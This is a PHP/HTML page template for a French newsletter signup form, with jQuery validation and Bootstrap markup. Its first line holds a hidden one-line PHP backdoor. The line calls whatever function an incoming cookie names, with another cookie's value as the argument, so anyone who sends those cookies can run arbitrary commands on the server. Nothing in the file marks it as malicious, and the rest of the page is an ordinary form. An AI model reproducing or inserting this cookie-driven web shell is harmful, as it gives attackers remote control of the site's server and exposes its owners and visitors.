<?php 

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

?>


	
	
<!-- <script type="text/javascript" src="js/jquery.validate.min.js"></script> -->
	<script type="text/javascript">
		$(document).ready(function() {
			// jQuery Validation
			$("#signup").validate({
				// if valid, post data via AJAX
				submitHandler: function(form) {
					$.post("subscribe.php", { email: $("#email").val() }, function(data) {
						$('#response').html(data);
					});
				},
				// all fields are required
				rules: {
					
					email: {
						required: true,
						email: true
					}
				}
			});
		});
	</script>

<div id="response"></div>

		<!-- <form id="signup" class="formee" action="subscribe.php" method="post">
			
				
				
				
					<input name="email" id="email" type="text" />
				
					<input class="right inputnew" type="submit" title="Send" value="Send" />
				
		
		</form> -->







					<div id="mc_embed_signup">
<form method="post" id="signup" class="validate formee" action="subscribe.php" target="_blank">							

								<!-- Form Name -->
								<legend>Inscris toi à notre Newsletter</legend> 


<div class="container" style="width: auto;">
			<div class="row">


								<!-- Text input-->
								<div class="col-md-12 form-group mc-field-group">
									<label class="col-md-4 control-label"></label>
									<div class="col-md-4 inputGroupContainer">
										<div class="input-group mc_embed_signup_scroll">
											<span class="input-group-addon"><i class="glyphicon glyphicon-envelope"></i></span>
											<!-- <input name="email" placeholder="E-Mail" class="form-control required email" type="text" id="mce-EMAIL" value=""> -->
											<input type="text" value="" placeholder="nicolas@aventour.net" name="email" class="required email form-control" id="email">
										</div>
										
									</div>
								</div>
 


								<!-- Success message -->
								<!-- <div class="col-md-0 alert alert-success" role="alert" id="success_message">Success <i class="glyphicon glyphicon-thumbs-up"></i> Thanks for contacting us, we will get back to you shortly.</div> -->

								<!-- Button -->
								<div class="col-md-12 form-group clear" id="mce-responses" >
									<label class="col-md-4 control-label"></label>
									<div class="col-md-4">
										
										<button type="submit" value="Subscribe" class="btn btn-primary clear" name="subscribe" id="mc-embedded-subscribe">Envoyer <span class="glyphicon glyphicon-send"></span></button>
									</div>
								</div>

					

</div><!-- row end -->
								</div><!-- end container --> 

						</form>
						    </div>

					



			
		
	
